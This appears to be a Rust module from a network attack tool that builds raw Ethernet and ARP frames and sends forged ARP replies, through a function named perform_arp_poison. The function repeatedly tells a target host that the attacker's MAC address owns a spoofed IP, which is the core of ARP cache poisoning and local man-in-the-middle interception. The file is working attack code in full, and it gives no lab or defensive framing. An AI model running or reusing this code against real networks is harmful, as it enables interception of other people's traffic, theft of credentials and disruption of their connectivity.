use std::error::Error;
use std::net::Ipv4Addr;

use crate::utils::{MacAddr, ipv4_to_bytes, send_packet};
use pcap::Device;

#[repr(C, packed)]
#[derive(Clone, Debug)]
pub struct EtherHeader {
    pub dst_mac: [u8; 6],
    pub src_mac: [u8; 6],
    pub ether_type: u16,
}

#[repr(C, packed)]
#[derive(Clone, Debug)]
pub struct ArpPacket {
    pub htype: u16,
    pub ptype: u16,
    pub hlen: u8,
    pub plen: u8,
    pub opcode: u16,
    pub sender_mac: [u8; 6],
    pub sender_ip: [u8; 4],
    pub target_mac: [u8; 6],
    pub target_ip: [u8; 4],
}

fn build_spoof_res(arp_packet: ArpPacket, eth_header: EtherHeader) -> [u8; 42] {
    let dstm = eth_header.dst_mac;
    let srcm = eth_header.src_mac;
    let e_type = eth_header.ether_type.to_be_bytes();

    let htype = arp_packet.htype.to_be_bytes();
    let ptype = arp_packet.ptype.to_be_bytes();
    let opcode = arp_packet.opcode.to_be_bytes();
    let smac = arp_packet.sender_mac;
    let sip = arp_packet.sender_ip;
    let tmac = arp_packet.target_mac;
    let tip = arp_packet.target_ip;

    [
        dstm[0],
        dstm[1],
        dstm[2],
        dstm[3],
        dstm[4],
        dstm[5], // dst MAC
        srcm[0],
        srcm[1],
        srcm[2],
        srcm[3],
        srcm[4],
        srcm[5], // src MAC
        e_type[0],
        e_type[1], // ether type (ARP = 0x0806)
        htype[0],
        htype[1], // hardware type
        ptype[0],
        ptype[1],        // protocol type
        arp_packet.hlen, // hardware size
        arp_packet.plen, // protocol size
        opcode[0],
        opcode[1], // opcode (request/reply)
        smac[0],
        smac[1],
        smac[2],
        smac[3],
        smac[4],
        smac[5], // sender MAC
        sip[0],
        sip[1],
        sip[2],
        sip[3], // sender IP
        tmac[0],
        tmac[1],
        tmac[2],
        tmac[3],
        tmac[4],
        tmac[5], // target MAC
        tip[0],
        tip[1],
        tip[2],
        tip[3], // target IP
    ]
}

pub fn perform_arp_poison(
    device: &Device,
    attacker_mac: MacAddr,
    target_mac: MacAddr,
    spoof_ip: Ipv4Addr,
    target_ip: Ipv4Addr,
    repeat: u16,
) -> Result<(), Box<dyn Error>> {
    let ether = EtherHeader {
        dst_mac: target_mac.0,
        src_mac: attacker_mac.0,
        ether_type: 0x0806,
    };

    let arp = ArpPacket {
        htype: 1,
        ptype: 0x0800,
        hlen: 6,
        plen: 4,
        opcode: 2,
        sender_mac: attacker_mac.0,
        sender_ip: ipv4_to_bytes(spoof_ip),
        target_mac: target_mac.0,
        target_ip: ipv4_to_bytes(target_ip),
    };

    let frame = build_spoof_res(arp, ether);

    for _ in 0..repeat {
        send_packet(device, &frame)?;
    }

    Ok(())
}
